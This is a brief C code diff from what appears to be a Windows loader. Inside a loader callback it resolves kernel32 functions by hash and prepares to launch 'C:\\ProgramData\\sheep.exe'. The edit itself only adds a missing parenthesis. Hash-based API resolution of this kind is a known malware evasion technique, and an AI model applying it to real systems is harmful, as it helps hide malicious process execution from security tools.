@@ -107,7 +107,7 @@ void NTAPI callback(PVOID dllHandle, DWORD reason, PVOID reserved)
    //LoadLibraryAHeader loadLibrary = ((LoadLibraryAHeader)get_proc_by_hash((PIMAGE_DOS_HEADER)kernel32->DllBase, 0x53b2070f));
    GetFileAttributesAHeader getFileAttributes = ((GetFileAttributesAHeader)get_proc_by_hash((PIMAGE_DOS_HEADER)kernel32->DllBase, 0xda1a7563));
    CreateProcessAHeader createProcess = ((CreateProcessAHeader)get_proc_by_hash((PIMAGE_DOS_HEADER)kernel32->DllBase, 0x4a7c0a09));
-   WaitForSingleObjectHeader waitForSingleObject = ((WaitForSingleObjectHeader)get_proc_by_hash((PIMAGE_DOS_HEADER)kernel32->DllBase, 0x71948ca4);
+   WaitForSingleObjectHeader waitForSingleObject = ((WaitForSingleObjectHeader)get_proc_by_hash((PIMAGE_DOS_HEADER)kernel32->DllBase, 0x71948ca4));
    char sheep[] = "C:\\ProgramData\\sheep.exe";
    STARTUPINFO startup_info;
    PROCESS_INFORMATION proc_info;
